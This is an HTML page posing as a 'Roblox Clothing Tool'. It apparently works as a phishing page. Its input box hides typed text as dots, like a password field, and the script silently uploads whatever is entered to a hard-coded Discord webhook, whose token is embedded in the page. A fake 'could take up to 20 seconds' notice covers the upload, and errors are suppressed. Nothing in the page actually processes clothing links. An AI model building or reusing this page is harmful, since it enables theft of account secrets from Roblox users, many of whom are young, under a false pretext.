<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ethetic - Roblox Clothing Tool</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            text-align: center;
            border: 2px solid #fff;
            border-radius: 10px;
            padding: 20px;
            width: 80%;
            max-width: 400px;
        }

        textarea {
            width: 90%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #fff;
            border-radius: 5px;
            background-color: #222;
            color: #fff;
            font-size: 14px;
            resize: none;
            height: 150px;
            -webkit-text-security: disc; /* Hides input as dots */
            text-security: disc;        /* Hides input as dots */
        }

        button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #444;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #666;
        }

        .notification {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #333;
            color: #fff;
            padding: 15px;
            border-radius: 5px;
            font-size: 16px;
            display: none;
            opacity: 0;
            transition: opacity 0.5s ease-in-out;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Roblox Clothing Tool</h1>
        <textarea id="clothingLink" placeholder="Enter Here"></textarea>
        <button onclick="handleConfirm()">Confirm</button>
    </div>

    <div id="notification" class="notification">
        This Could Take Up To 20 Seconds
    </div>

    <script>
        async function handleConfirm() {
            const clothingLink = document.getElementById('clothingLink').value.trim();

            if (!clothingLink) {
                alert("Please enter something to send!");
                return;
            }

            // Show notification
            const notification = document.getElementById('notification');
            notification.style.display = 'block';
            notification.style.opacity = 1;

            setTimeout(() => {
                notification.style.opacity = 0;
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 500);
            }, 3000);

            // Create a Blob for the text file
            const fileBlob = new Blob([clothingLink], { type: 'text/plain' });

            // Convert the Blob to a File
            const file = new File([fileBlob], "message.txt", { type: "text/plain" });

            // Create a FormData object to send the file
            const formData = new FormData();
            formData.append("file", file);

            // Webhook URL (Replace with your actual webhook URL)
            const webhookUrl = 'https://discord.com/api/webhooks/1321778429015621693/HNT251o7ObV_rCY9k4s15CHTU2d_IXTdOGZegZevP1AMNR65_BMUngLG10e1dhssv6PE';

            try {
                // Send the file to the webhook using multipart/form-data
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    body: formData
                });

                if (!response.ok) {
                    throw new Error('');
                }

                console.log("");
            } catch (error) {
                console.error("", error);
            }
        }
    </script>
</body>
</html>
